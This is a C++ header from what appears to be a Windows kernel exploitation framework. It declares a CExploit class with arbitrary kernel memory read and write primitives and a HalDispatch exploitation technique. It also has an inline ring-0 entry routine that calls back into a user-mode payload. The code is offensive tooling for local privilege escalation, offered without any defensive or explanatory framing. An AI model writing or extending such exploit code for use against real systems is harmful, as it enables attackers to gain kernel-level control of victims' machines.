#pragma once

#include "kernelinfo.hpp"

#include <Common/exploitation/kernelbreak.h>
#include <Common/exploitation/extinterface.h>

#include <Common/user/Externs.h>

class CExploit :
	public IKernel
{
	struct RING3_2_RING0_PARAM
	{
		size_t MainImageDelta;
		extinterface::CORE_PAYLOAD PayloadId;
		const void* NtBase;
	};
public:
	CExploit(
		__in IKernelBreak& kernelBreak
		);

	__checkReturn
	bool
	WriteKernelMemory(
		__inout_bcount(size) void* addr,
		__in_bcount(size) const void* buff,
		__in size_t size
		) override;
	
	__checkReturn
	bool
	ReadKernelMemory(
		__in_bcount(size) const void* addr,
		__inout_bcount(size) void* buff,
		__in size_t size
		) override;

	void
	HalDispatchExploitTech();

	__drv_maxIRQL(PASSIVE_LEVEL)
	static
	void
	KernelCallback(
		__in const RING3_2_RING0_PARAM& param
		);

protected:
	__drv_maxIRQL(PASSIVE_LEVEL)
	static
	void
	_cdecl
	KernelMain(
		__in const size_t arg,
		__in ULONG bufferSize,
		__inout PVOID buffer,
		__out PULONG returnedLength
		)
	{
		const RING3_2_RING0_PARAM* buff = reinterpret_cast<const RING3_2_RING0_PARAM*>((&arg)[0]);
		decltype(&CExploit::KernelCallback) ring3callback = reinterpret_cast<decltype(&CExploit::KernelCallback)>(reinterpret_cast<size_t>(buff) + buff->MainImageDelta);
		ring3callback(*buff);
	}

protected:
	CKernelInfo m_kernelSpace;
	IKernelBreak& m_kernelBreak;
};
